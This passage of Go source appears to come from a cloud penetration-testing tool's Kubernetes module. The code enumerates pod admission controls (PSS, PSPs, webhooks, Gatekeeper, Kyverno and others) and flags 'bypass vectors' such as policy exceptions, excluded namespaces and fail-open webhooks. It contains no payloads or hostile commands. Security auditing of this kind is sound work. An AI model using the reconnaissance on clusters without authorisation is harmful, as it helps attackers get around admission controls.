		// Add webhook table if webhooks exist
		if len(webhookRows) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "Pod-Admission-Webhooks",
				Header: webhookHeaders,
				Body:   webhookRows,
			})
		}

		// Add PSP table if PSPs exist
		if len(pspRows) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "Pod-Admission-PSP",
				Header: pspHeaders,
				Body:   pspRows,
			})
		}

		// Add VAP table if VAPs exist
		if len(vapRows) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "Pod-Admission-VAP",
				Header: vapHeaders,
				Body:   vapRows,
			})
		}

		// Add Gatekeeper table if constraints exist
		if len(gatekeeperRows) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "Pod-Admission-Gatekeeper",
				Header: gatekeeperHeaders,
				Body:   gatekeeperRows,
			})
		}

		// Add Kyverno table if policies exist
		if len(kyvernoRows) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "Pod-Admission-Kyverno",
				Header: kyvernoHeaders,
				Body:   kyvernoRows,
			})
		}

		// Add Kyverno exceptions table if exceptions exist (bypass vectors!)
		if len(kyvernoExceptionRows) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "Pod-Admission-Kyverno-Exceptions",
				Header: kyvernoExceptionHeaders,
				Body:   kyvernoExceptionRows,
			})
		}

		// Add Kubewarden table if policies exist
		if len(kubewardenRows) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "Pod-Admission-Kubewarden",
				Header: kubewardenHeaders,
				Body:   kubewardenRows,
			})
		}

		// Add jsPolicy table if policies exist
		if len(jsPolicyRows) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "Pod-Admission-jsPolicy",
				Header: jsPolicyHeaders,
				Body:   jsPolicyRows,
			})
		}

		// Add Gatekeeper exclusions table if exclusions exist (bypass vectors!)
		if len(gatekeeperExclusionRows) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "Pod-Admission-Gatekeeper-Exclusions",
				Header: gatekeeperExclusionHeaders,
				Body:   gatekeeperExclusionRows,
			})
		}

		// Add Polaris table if Polaris is configured
		if len(polarisRows) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "Pod-Admission-Polaris",
				Header: polarisHeaders,
				Body:   polarisRows,
			})
		}

		// Add Datree table if Datree is configured
		if len(datreeRows) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "Pod-Admission-Datree",
				Header: datreeHeaders,
				Body:   datreeRows,
			})
		}

		// Add AWS Pod Identity table if identities exist
		if len(awsPodIdentityRows) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "Pod-Admission-AWS-Pod-Identity",
				Header: awsPodIdentityHeaders,
				Body:   awsPodIdentityRows,
			})
		}

		// Add GCP Workload Identity table if identities exist
		if len(gcpWorkloadIdentityRows) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "Pod-Admission-GCP-Workload-Identity",
				Header: gcpWorkloadIdentityHeaders,
				Body:   gcpWorkloadIdentityRows,
			})
		}

		// Add Azure Workload Identity table if identities exist
		if len(azureWorkloadIdentityRows) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "Pod-Admission-Azure-Workload-Identity",
				Header: azureWorkloadIdentityHeaders,
				Body:   azureWorkloadIdentityRows,
			})
		}

		// Add Capsule Tenant Pod Policy table if policies exist
		if len(capsuleTenantPodRows) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "Pod-Admission-Capsule-Tenant",
				Header: capsuleTenantPodHeaders,
				Body:   capsuleTenantPodRows,
			})
		}

		// Add Rancher Project Pod Policy table if policies exist
		if len(rancherProjectPodRows) > 0 {
			tables = append(tables, internal.TableFile{
				Name:   "Pod-Admission-Rancher-Project",
				Header: rancherProjectPodHeaders,
				Body:   rancherProjectPodRows,
			})
		}
	}

	lootFiles := loot.Build()

	err := internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Pod-Admission",
		globals.ClusterName,
		"results",
		PodAdmissionOutput{
			Table: tables,
			Loot:  lootFiles,
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_POD_SECURITY_MODULE_NAME)
		return
	}

	// Count vulnerable namespaces
	noEnforcementCount := 0
	webhookBypassCount := 0
	for _, finding := range findings {
		if finding.NoEnforcement || finding.PSSEnforceLevel == "privileged" {
			noEnforcementCount++
		}
		// Count webhooks with Ignore failure policy
		for _, wh := range finding.MutatingWebhooks {
			if wh.FailurePolicy == "Ignore" {
				webhookBypassCount++
				break
			}
		}
		if webhookBypassCount == noEnforcementCount {
			continue
		}
		for _, wh := range finding.ValidatingWebhooks {
			if wh.FailurePolicy == "Ignore" {
				webhookBypassCount++
				break
			}
		}
	}

	if len(outputRows) > 0 {
		logger.InfoM(fmt.Sprintf("%d namespaces analyzed (%d no enforcement, %d webhook bypass risk)", len(outputRows), noEnforcementCount, webhookBypassCount), globals.K8S_POD_SECURITY_MODULE_NAME)
		if len(webhookRows) > 0 {
			logger.InfoM(fmt.Sprintf("%d admission webhooks found", len(webhookRows)), globals.K8S_POD_SECURITY_MODULE_NAME)
		}
		if len(pspRows) > 0 {
			logger.InfoM(fmt.Sprintf("%d PSPs found (deprecated)", len(pspRows)), globals.K8S_POD_SECURITY_MODULE_NAME)
		}
	} else {
		logger.InfoM("No pod security configurations found", globals.K8S_POD_SECURITY_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_POD_SECURITY_MODULE_NAME), globals.K8S_POD_SECURITY_MODULE_NAME)
}

// analyzePodSecurityStandards analyzes PSS labels and annotations
func analyzePodSecurityStandards(ns corev1.Namespace) PSSAnalysis {
	analysis := PSSAnalysis{}

	// Check enforce mode
	if enforce, exists := ns.Labels["pod-security.kubernetes.io/enforce"]; exists {
		analysis.EnforceLevel = enforce
		if version, exists := ns.Labels["pod-security.kubernetes.io/enforce-version"]; exists {
			analysis.EnforceVersion = version
		}
	}

	// Check warn mode
	if warn, exists := ns.Labels["pod-security.kubernetes.io/warn"]; exists {
		analysis.WarnLevel = warn
		if version, exists := ns.Labels["pod-security.kubernetes.io/warn-version"]; exists {
			analysis.WarnVersion = version
		}
	}

	// Check audit mode
	if audit, exists := ns.Labels["pod-security.kubernetes.io/audit"]; exists {
		analysis.AuditLevel = audit
		if version, exists := ns.Labels["pod-security.kubernetes.io/audit-version"]; exists {
			analysis.AuditVersion = version
		}
	}

	// Check for exemptions
	if exempt, exists := ns.Labels["pod-security.kubernetes.io/exempt"]; exists {
		analysis.IsExempt = true
		analysis.ExemptReason = exempt
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			fmt.Sprintf("Namespace is exempt from PSS: %s", exempt))
	}

	// Security assessment
	if analysis.EnforceLevel == "" {
		analysis.NoEnforcement = true
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"No PSS enforcement - accepts all pod configurations")
	} else {
		switch analysis.EnforceLevel {
		case "privileged":
			analysis.WeakEnforcement = true
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"PSS enforce level 'privileged' - no restrictions (equivalent to no enforcement)")
		case "baseline":
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"PSS baseline allows some risky configurations (hostNetwork with restrictions, unsafe sysctls)")
		case "restricted":
			// No security issues for restricted level
		default:
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				fmt.Sprintf("Unknown PSS level: %s", analysis.EnforceLevel))
		}
	}

	// Check for warn/audit only (no enforcement)
	if analysis.EnforceLevel == "" && (analysis.WarnLevel != "" || analysis.AuditLevel != "") {
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"PSS warn/audit mode only - pods not blocked, only logged")
	}

	return analysis
}

// analyzePSPs analyzes Pod Security Policies
func analyzePSPs(ctx context.Context, dynClient dynamic.Interface) []PSPAnalysis {
	var analyses []PSPAnalysis

	pspGVR := schema.GroupVersionResource{Group: "policy", Version: "v1beta1", Resource: "podsecuritypolicies"}
	pspList, err := dynClient.Resource(pspGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		return analyses
	}

	for _, psp := range pspList.Items {
		analysis := PSPAnalysis{
			Name:               psp.GetName(),
			DeprecationWarning: "PSP is deprecated since Kubernetes 1.21 and removed in 1.25",
		}

		spec, found, _ := unstructured.NestedMap(psp.Object, "spec")
		if !found {
			continue
		}

		// Check privileged
		if privileged, _, _ := unstructured.NestedBool(spec, "privileged"); privileged {
			analysis.AllowsPrivileged = true
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Allows privileged containers (full node compromise)")
		}

		// Check hostNetwork
		if hostNetwork, _, _ := unstructured.NestedBool(spec, "hostNetwork"); hostNetwork {
			analysis.AllowsHostNetwork = true
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Allows host network access (network sniffing, service impersonation)")
		}

		// Check hostPID
		if hostPID, _, _ := unstructured.NestedBool(spec, "hostPID"); hostPID {
			analysis.AllowsHostPID = true
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Allows host PID namespace (process inspection, signal injection)")
		}

		// Check hostIPC
		if hostIPC, _, _ := unstructured.NestedBool(spec, "hostIPC"); hostIPC {
			analysis.AllowsHostIPC = true
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Allows host IPC namespace (shared memory access)")
		}

		// Check allowedCapabilities
		caps, _, _ := unstructured.NestedStringSlice(spec, "allowedCapabilities")
		dangerousCaps := map[string]string{
			"SYS_ADMIN":       "Full system administration",
			"NET_ADMIN":       "Network administration",
			"SYS_PTRACE":      "Process tracing",
			"SYS_MODULE":      "Load kernel modules",
			"DAC_READ_SEARCH": "Bypass file read permission checks",
			"DAC_OVERRIDE":    "Bypass file write permission checks",
		}

		for _, cap := range caps {
			if cap == "*" {
				analysis.AllowedCapabilities = append(analysis.AllowedCapabilities, "ALL")
				analysis.SecurityIssues = append(analysis.SecurityIssues,
					"Allows ALL capabilities (complete privilege escalation)")
				break
			}
			if desc, exists := dangerousCaps[cap]; exists {
				analysis.AllowedCapabilities = append(analysis.AllowedCapabilities, cap)
				analysis.SecurityIssues = append(analysis.SecurityIssues,
					fmt.Sprintf("Allows dangerous capability %s: %s", cap, desc))
			}
		}

		// Check allowedHostPaths
		hostPaths, found, _ := unstructured.NestedSlice(spec, "allowedHostPaths")
		if found && len(hostPaths) > 0 {
			analysis.AllowsHostPath = true
			for _, hp := range hostPaths {
				if hpMap, ok := hp.(map[string]interface{}); ok {
					if pathPrefix, ok := hpMap["pathPrefix"].(string); ok {
						analysis.AllowedHostPaths = append(analysis.AllowedHostPaths, pathPrefix)
						if pathPrefix == "/" || strings.HasPrefix(pathPrefix, "/var/lib/kubelet") {
							analysis.SecurityIssues = append(analysis.SecurityIssues,
								fmt.Sprintf("Allows dangerous hostPath: %s", pathPrefix))
						}
					}
				}
			}
		}

		// Check runAsUser
		runAsUser, found, _ := unstructured.NestedMap(spec, "runAsUser")
		if found {
			if rule, ok := runAsUser["rule"].(string); ok {
				analysis.RunAsUserRule = rule
				if rule == "RunAsAny" {
					analysis.AllowsRunAsRoot = true
					analysis.SecurityIssues = append(analysis.SecurityIssues,
						"Allows running as any user including root")
				}
			}
		}

		analyses = append(analyses, analysis)
	}

	return analyses
}

// analyzeWebhooks analyzes admission webhooks
func analyzeWebhooks(ctx context.Context, dynClient dynamic.Interface, resourceType string) []WebhookInfo {
	var webhooks []WebhookInfo

	gvr := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: resourceType,
	}

	webhookList, err := dynClient.Resource(gvr).List(ctx, metav1.ListOptions{})
	if err != nil {
		return webhooks
	}

	whType := "validating"
	if resourceType == "mutatingwebhookconfigurations" {
		whType = "mutating"
	}

	for _, wh := range webhookList.Items {
		whks, found := wh.Object["webhooks"].([]interface{})
		if !found {
			continue
		}

		for _, w := range whks {
			wMap := w.(map[string]interface{})

			// Check if targets pods
			rules, ok := wMap["rules"].([]interface{})
			if !ok {
				continue
			}

			targetsPods := false
			for _, r := range rules {
				rMap := r.(map[string]interface{})
				resources, _ := rMap["resources"].([]interface{})
				for _, res := range resources {
					if resStr, ok := res.(string); ok && resStr == "pods" {
						targetsPods = true
					}
				}
			}

			if !targetsPods {
				continue
			}

			info := WebhookInfo{
				Name: wh.GetName(),
				Type: whType,
			}

			// Check failure policy
			if failurePolicy, ok := wMap["failurePolicy"].(string); ok {
				info.FailurePolicy = failurePolicy
				if failurePolicy == "Ignore" {
					info.SecurityIssues = append(info.SecurityIssues,
						"Failure policy 'Ignore' - webhook failures don't block pods")
				}
			}

			// Check side effects
			if sideEffects, ok := wMap["sideEffects"].(string); ok {
				info.SideEffects = sideEffects
			}

			// Check timeout
			if timeout, ok := wMap["timeoutSeconds"].(int64); ok {
				info.TimeoutSeconds = int32(timeout)
				if timeout > 10 {
					info.SecurityIssues = append(info.SecurityIssues,
						fmt.Sprintf("Long timeout (%ds) - performance impact", timeout))
				}
			}

			// Check namespace selector
			if nsSelector, ok := wMap["namespaceSelector"].(map[string]interface{}); ok {
				if len(nsSelector) > 0 {
					info.NamespaceSelector = "configured"
					info.HasExclusions = true
					info.SecurityIssues = append(info.SecurityIssues,
						"Namespace selector configured - some namespaces may be excluded")
				}
			}

			webhooks = append(webhooks, info)
		}
	}

	return webhooks
}

// filterWebhooksForNamespace determines which webhooks apply to a namespace
func filterWebhooksForNamespace(webhooks []WebhookInfo, nsName string, nsLabels map[string]string) []WebhookInfo {
	var applicable []WebhookInfo

	for _, wh := range webhooks {
		// If webhook has no namespace selector, it applies to all namespaces
		if wh.NamespaceSelector == "" {
			applicable = append(applicable, wh)
		}
		// TODO: Implement actual namespace selector matching logic
	}

	return applicable
}

// analyzeValidatingAdmissionPolicies analyzes ValidatingAdmissionPolicy (K8s 1.26+)
func analyzeValidatingAdmissionPolicies(ctx context.Context, dynClient dynamic.Interface) []ValidatingAdmissionPolicyInfo {
	var policies []ValidatingAdmissionPolicyInfo

	// ValidatingAdmissionPolicy
	vapGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingadmissionpolicies",
	}

	vapList, err := dynClient.Resource(vapGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		// Try v1beta1 for older clusters
		vapGVR.Version = "v1beta1"
		vapList, err = dynClient.Resource(vapGVR).List(ctx, metav1.ListOptions{})
		if err != nil {
			return policies
		}
	}

	// Get bindings
	vapbGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingadmissionpolicybindings",
	}
	bindingsMap := make(map[string][]string)

	vapbList, err := dynClient.Resource(vapbGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		vapbGVR.Version = "v1beta1"
		vapbList, _ = dynClient.Resource(vapbGVR).List(ctx, metav1.ListOptions{})
	}

	if vapbList != nil {
		for _, binding := range vapbList.Items {
			policyName, _, _ := unstructured.NestedString(binding.Object, "spec", "policyName")
			if policyName != "" {
				bindingsMap[policyName] = append(bindingsMap[policyName], binding.GetName())
			}
		}
	}

	for _, vap := range vapList.Items {
		info := ValidatingAdmissionPolicyInfo{
			Name:     vap.GetName(),
			Bindings: bindingsMap[vap.GetName()],
		}

		// Get failure policy
		if fp, ok, _ := unstructured.NestedString(vap.Object, "spec", "failurePolicy"); ok {
			info.FailurePolicy = fp
		}

		// Extract validations and CEL expressions
		if validations, ok, _ := unstructured.NestedSlice(vap.Object, "spec", "validations"); ok {
			info.Validations = len(validations)
			// Extract CEL expressions for blocking detection
			for _, v := range validations {
				if vMap, ok := v.(map[string]interface{}); ok {
					if expr, ok := vMap["expression"].(string); ok {
						info.CELExpressions = append(info.CELExpressions, expr)
					}
				}
			}
		}

		// Count audit annotations
		if auditAnnotations, ok, _ := unstructured.NestedSlice(vap.Object, "spec", "auditAnnotations"); ok {
			info.AuditAnnotations = len(auditAnnotations)
		}

		// Get paramKind
		if paramKind, ok, _ := unstructured.NestedMap(vap.Object, "spec", "paramKind"); ok {
			if kind, ok := paramKind["kind"].(string); ok {
				info.ParamKind = kind
			}
		}

		// Get match resources summary
		if matchConstraints, ok, _ := unstructured.NestedMap(vap.Object, "spec", "matchConstraints"); ok {
			if resourceRules, ok := matchConstraints["resourceRules"].([]interface{}); ok && len(resourceRules) > 0 {
				info.MatchResources = fmt.Sprintf("%d resource rules", len(resourceRules))
			}
		}

		policies = append(policies, info)
	}

	return policies
}

// analyzeGatekeeperConstraints analyzes OPA Gatekeeper constraints
func analyzeGatekeeperConstraints(ctx context.Context, dynClient dynamic.Interface) ([]GatekeeperTemplateInfo, []GatekeeperConstraintInfo) {
	var templates []GatekeeperTemplateInfo
	var constraints []GatekeeperConstraintInfo

	// Get ConstraintTemplates
	ctGVR := schema.GroupVersionResource{
		Group:    "templates.gatekeeper.sh",
		Version:  "v1",
		Resource: "constrainttemplates",
	}

	ctList, err := dynClient.Resource(ctGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		// Try v1beta1
		ctGVR.Version = "v1beta1"
		ctList, err = dynClient.Resource(ctGVR).List(ctx, metav1.ListOptions{})
		if err != nil {
			return templates, constraints
		}
	}

	for _, ct := range ctList.Items {
		info := GatekeeperTemplateInfo{
			Name: ct.GetName(),
		}

		// Get the CRD kind it creates
		if crd, ok, _ := unstructured.NestedMap(ct.Object, "spec", "crd", "spec", "names"); ok {
			if kind, ok := crd["kind"].(string); ok {
				info.Kind = kind
			}
		}

		// Get targets and extract Rego code
		if targets, ok, _ := unstructured.NestedSlice(ct.Object, "spec", "targets"); ok {
			for _, t := range targets {
				if tMap, ok := t.(map[string]interface{}); ok {
					if target, ok := tMap["target"].(string); ok {
						info.Targets = append(info.Targets, target)
					}
					// Extract Rego code for content-based blocking detection
					if rego, ok := tMap["rego"].(string); ok {
						info.RegoContent = rego
					}
				}
			}
		}

		templates = append(templates, info)

		// Now get constraints of this type
		if info.Kind != "" {
			constraintGVR := schema.GroupVersionResource{
				Group:    "constraints.gatekeeper.sh",
				Version:  "v1beta1",
				Resource: strings.ToLower(info.Kind),
			}

			constraintList, err := dynClient.Resource(constraintGVR).List(ctx, metav1.ListOptions{})
			if err != nil {
				continue
			}

			for _, c := range constraintList.Items {
				cInfo := GatekeeperConstraintInfo{
					Name:        c.GetName(),
					Kind:        info.Kind,
					RegoContent: info.RegoContent, // Attach Rego from template
				}

				// Get enforcement action
				if ea, ok, _ := unstructured.NestedString(c.Object, "spec", "enforcementAction"); ok {
					cInfo.EnforcementAction = ea
				} else {
					cInfo.EnforcementAction = "deny" // default
				}

				// Get match kinds
				if match, ok, _ := unstructured.NestedMap(c.Object, "spec", "match"); ok {
					if kinds, ok := match["kinds"].([]interface{}); ok {
						cInfo.Match = fmt.Sprintf("%d kind rules", len(kinds))
					}
				}

				// Get violation count from status
				if violations, ok, _ := unstructured.NestedSlice(c.Object, "status", "violations"); ok {
					cInfo.Violations = len(violations)
				}

				constraints = append(constraints, cInfo)
			}
		}
	}

	return templates, constraints
}

// analyzeKyvernoPolicies analyzes Kyverno policies
func analyzeKyvernoPolicies(ctx context.Context, dynClient dynamic.Interface) ([]KyvernoPolicyInfo, []KyvernoExceptionInfo) {
	var policies []KyvernoPolicyInfo
	var exceptions []KyvernoExceptionInfo

	// ClusterPolicy
	cpGVR := schema.GroupVersionResource{
		Group:    "kyverno.io",
		Version:  "v1",
		Resource: "clusterpolicies",
	}

	cpList, err := dynClient.Resource(cpGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, cp := range cpList.Items {
			info := KyvernoPolicyInfo{
				Name:            cp.GetName(),
				IsClusterPolicy: true,
			}

			// Get validation failure action
			if vfa, ok, _ := unstructured.NestedString(cp.Object, "spec", "validationFailureAction"); ok {
				info.ValidationFailure = vfa
			}

			// Get background
			if bg, ok, _ := unstructured.NestedBool(cp.Object, "spec", "background"); ok {
				info.Background = bg
			}

			// Get rules and extract patterns for blocking detection
			if rules, ok, _ := unstructured.NestedSlice(cp.Object, "spec", "rules"); ok {
				info.Rules = len(rules)
				for _, r := range rules {
					if rMap, ok := r.(map[string]interface{}); ok {
						if name, ok := rMap["name"].(string); ok {
							info.RuleNames = append(info.RuleNames, name)
						}
						// Extract validate patterns for blocking detection
						if validate, ok := rMap["validate"].(map[string]interface{}); ok {
							// Convert the entire validate section to a string for pattern matching
							validateStr := fmt.Sprintf("%v", validate)
							info.RulePatterns = append(info.RulePatterns, validateStr)
						}
					}
				}
			}

			policies = append(policies, info)
		}
	}

	// Policy (namespace-scoped)
	pGVR := schema.GroupVersionResource{
		Group:    "kyverno.io",
		Version:  "v1",
		Resource: "policies",
	}

	pList, err := dynClient.Resource(pGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, p := range pList.Items {
			info := KyvernoPolicyInfo{
				Name:            p.GetName(),
				Namespace:       p.GetNamespace(),
				IsClusterPolicy: false,
			}

			if vfa, ok, _ := unstructured.NestedString(p.Object, "spec", "validationFailureAction"); ok {
				info.ValidationFailure = vfa
			}

			if bg, ok, _ := unstructured.NestedBool(p.Object, "spec", "background"); ok {
				info.Background = bg
			}

			if rules, ok, _ := unstructured.NestedSlice(p.Object, "spec", "rules"); ok {
				info.Rules = len(rules)
				for _, r := range rules {
					if rMap, ok := r.(map[string]interface{}); ok {
						if name, ok := rMap["name"].(string); ok {
							info.RuleNames = append(info.RuleNames, name)
						}
						// Extract validate patterns for blocking detection
						if validate, ok := rMap["validate"].(map[string]interface{}); ok {
							validateStr := fmt.Sprintf("%v", validate)
							info.RulePatterns = append(info.RulePatterns, validateStr)
						}
					}
				}
			}

			policies = append(policies, info)
		}
	}

	// PolicyException (bypass vector!)
	peGVR := schema.GroupVersionResource{
		Group:    "kyverno.io",
		Version:  "v2",
		Resource: "policyexceptions",
	}

	peList, err := dynClient.Resource(peGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err != nil {
		// Try v2beta1
		peGVR.Version = "v2beta1"
		peList, _ = dynClient.Resource(peGVR).Namespace("").List(ctx, metav1.ListOptions{})
	}

	if peList != nil {
		for _, pe := range peList.Items {
			info := KyvernoExceptionInfo{
				Name:      pe.GetName(),
				Namespace: pe.GetNamespace(),
			}

			// Get exceptions
			if exceptions, ok, _ := unstructured.NestedSlice(pe.Object, "spec", "exceptions"); ok {
				for _, e := range exceptions {
					if eMap, ok := e.(map[string]interface{}); ok {
						if policyName, ok := eMap["policyName"].(string); ok {
							info.Policies = append(info.Policies, policyName)
						}
						if ruleNames, ok := eMap["ruleNames"].([]interface{}); ok {
							for _, rn := range ruleNames {
								if rnStr, ok := rn.(string); ok {
									info.Rules = append(info.Rules, rnStr)
								}
							}
						}
					}
				}
			}

			// Get match summary
			if match, ok, _ := unstructured.NestedMap(pe.Object, "spec", "match"); ok {
				if any, ok := match["any"].([]interface{}); ok {
					info.Match = fmt.Sprintf("%d match rules", len(any))
				} else if all, ok := match["all"].([]interface{}); ok {
					info.Match = fmt.Sprintf("%d match rules", len(all))
				}
			}

			exceptions = append(exceptions, info)
		}
	}

	return policies, exceptions
}

// analyzeKubewardenPolicies analyzes Kubewarden policies
func analyzeKubewardenPolicies(ctx context.Context, dynClient dynamic.Interface) []KubewardenPolicyInfo {
	var policies []KubewardenPolicyInfo

	// ClusterAdmissionPolicy
	capGVR := schema.GroupVersionResource{
		Group:    "policies.kubewarden.io",
		Version:  "v1",
		Resource: "clusteradmissionpolicies",
	}

	capList, err := dynClient.Resource(capGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, cap := range capList.Items {
			info := KubewardenPolicyInfo{
				Name:            cap.GetName(),
				IsClusterPolicy: true,
			}

			if module, ok, _ := unstructured.NestedString(cap.Object, "spec", "module"); ok {
				info.Module = module
			}

			if mode, ok, _ := unstructured.NestedString(cap.Object, "spec", "mode"); ok {
				info.Mode = mode
			} else {
				info.Mode = "protect" // default
			}

			if mutating, ok, _ := unstructured.NestedBool(cap.Object, "spec", "mutating"); ok {
				info.Mutating = mutating
			}

			if rules, ok, _ := unstructured.NestedSlice(cap.Object, "spec", "rules"); ok {
				info.Rules = fmt.Sprintf("%d rules", len(rules))
			}

			// Extract settings for content-based blocking detection
			if settings, ok, _ := unstructured.NestedMap(cap.Object, "spec", "settings"); ok {
				info.Settings = fmt.Sprintf("%v", settings)
			}

			policies = append(policies, info)
		}
	}

	// AdmissionPolicy (namespace-scoped)
	apGVR := schema.GroupVersionResource{
		Group:    "policies.kubewarden.io",
		Version:  "v1",
		Resource: "admissionpolicies",
	}

	apList, err := dynClient.Resource(apGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, ap := range apList.Items {
			info := KubewardenPolicyInfo{
				Name:            ap.GetName(),
				Namespace:       ap.GetNamespace(),
				IsClusterPolicy: false,
			}

			if module, ok, _ := unstructured.NestedString(ap.Object, "spec", "module"); ok {
				info.Module = module
			}

			if mode, ok, _ := unstructured.NestedString(ap.Object, "spec", "mode"); ok {
				info.Mode = mode
			} else {
				info.Mode = "protect"
			}

			if mutating, ok, _ := unstructured.NestedBool(ap.Object, "spec", "mutating"); ok {
				info.Mutating = mutating
			}

			if rules, ok, _ := unstructured.NestedSlice(ap.Object, "spec", "rules"); ok {
				info.Rules = fmt.Sprintf("%d rules", len(rules))
			}

			// Extract settings for content-based blocking detection
			if settings, ok, _ := unstructured.NestedMap(ap.Object, "spec", "settings"); ok {
				info.Settings = fmt.Sprintf("%v", settings)
			}

			policies = append(policies, info)
		}
	}

	return policies
}

// analyzeGatekeeperConfig analyzes Gatekeeper Config for namespace exclusions (bypass vectors)
func analyzeGatekeeperConfig(ctx context.Context, dynClient dynamic.Interface) GatekeeperConfigInfo {
	info := GatekeeperConfigInfo{}

	configGVR := schema.GroupVersionResource{
		Group:    "config.gatekeeper.sh",
		Version:  "v1alpha1",
		Resource: "configs",
	}

	configList, err := dynClient.Resource(configGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		return info
	}

	for _, cfg := range configList.Items {
		info.Name = cfg.GetName()

		// Get excluded namespaces from spec.match
		if match, ok, _ := unstructured.NestedSlice(cfg.Object, "spec", "match"); ok {
			for _, m := range match {
				if mMap, ok := m.(map[string]interface{}); ok {
					if excludedNs, ok := mMap["excludedNamespaces"].([]interface{}); ok {
						for _, ns := range excludedNs {
							if nsStr, ok := ns.(string); ok {
								info.ExcludedNamespaces = append(info.ExcludedNamespaces, nsStr)
							}
						}
					}
				}
			}
		}

		// Get exempt images
		if validation, ok, _ := unstructured.NestedMap(cfg.Object, "spec", "validation"); ok {
			if traces, ok := validation["traces"].([]interface{}); ok {
				for _, t := range traces {
					if tMap, ok := t.(map[string]interface{}); ok {
						if exempt, ok := tMap["exemptImages"].([]interface{}); ok {
							for _, img := range exempt {
								if imgStr, ok := img.(string); ok {
									info.ExemptImages = append(info.ExemptImages, imgStr)
								}
							}
						}
					}
				}
			}
		}
	}

	return info
}

// analyzeJsPolicies analyzes jsPolicy policies
func analyzeJsPolicies(ctx context.Context, dynClient dynamic.Interface) []JsPolicyInfo {
	var policies []JsPolicyInfo

	// ClusterJsPolicy
	cjpGVR := schema.GroupVersionResource{
		Group:    "policy.jspolicy.com",
		Version:  "v1beta1",
		Resource: "clusterjspolicies",
	}

	cjpList, err := dynClient.Resource(cjpGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, cjp := range cjpList.Items {
			info := JsPolicyInfo{
				Name:            cjp.GetName(),
				IsClusterPolicy: true,
			}

			// Get type (Validating, Mutating, Controller)
			if t, ok, _ := unstructured.NestedString(cjp.Object, "spec", "type"); ok {
				info.Type = t
			} else {
				info.Type = "Validating"
			}

			// Get operations
			if ops, ok, _ := unstructured.NestedStringSlice(cjp.Object, "spec", "operations"); ok {
				info.Operations = ops
			}

			// Get resources
			if resources, ok, _ := unstructured.NestedSlice(cjp.Object, "spec", "resources"); ok {
				for _, r := range resources {
					if rStr, ok := r.(string); ok {
						info.Resources = append(info.Resources, rStr)
					}
				}
			}

			// Get violation policy
			if vp, ok, _ := unstructured.NestedString(cjp.Object, "spec", "violationPolicy"); ok {
				info.ViolationPolicy = vp
			}

			// Extract JavaScript code for content-based blocking detection
			if js, ok, _ := unstructured.NestedString(cjp.Object, "spec", "javascript"); ok {
				info.JavaScriptCode = js
			}

			policies = append(policies, info)
		}
	}

	// JsPolicy (namespace-scoped)
	jpGVR := schema.GroupVersionResource{
		Group:    "policy.jspolicy.com",
		Version:  "v1beta1",
		Resource: "jspolicies",
	}

	jpList, err := dynClient.Resource(jpGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, jp := range jpList.Items {
			info := JsPolicyInfo{
				Name:            jp.GetName(),
				Namespace:       jp.GetNamespace(),
				IsClusterPolicy: false,
			}

			if t, ok, _ := unstructured.NestedString(jp.Object, "spec", "type"); ok {
				info.Type = t
			} else {
				info.Type = "Validating"
			}

			if ops, ok, _ := unstructured.NestedStringSlice(jp.Object, "spec", "operations"); ok {
				info.Operations = ops
			}

			if resources, ok, _ := unstructured.NestedSlice(jp.Object, "spec", "resources"); ok {
				for _, r := range resources {
					if rStr, ok := r.(string); ok {
						info.Resources = append(info.Resources, rStr)
					}
				}
			}

			if vp, ok, _ := unstructured.NestedString(jp.Object, "spec", "violationPolicy"); ok {
				info.ViolationPolicy = vp
			}

			// Extract JavaScript code for content-based blocking detection
			if js, ok, _ := unstructured.NestedString(jp.Object, "spec", "javascript"); ok {
				info.JavaScriptCode = js
			}

			policies = append(policies, info)
		}
	}

	return policies
}

// analyzePolarisConfig analyzes Polaris webhook and configuration
func analyzePolarisConfig(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) PolarisConfigInfo {
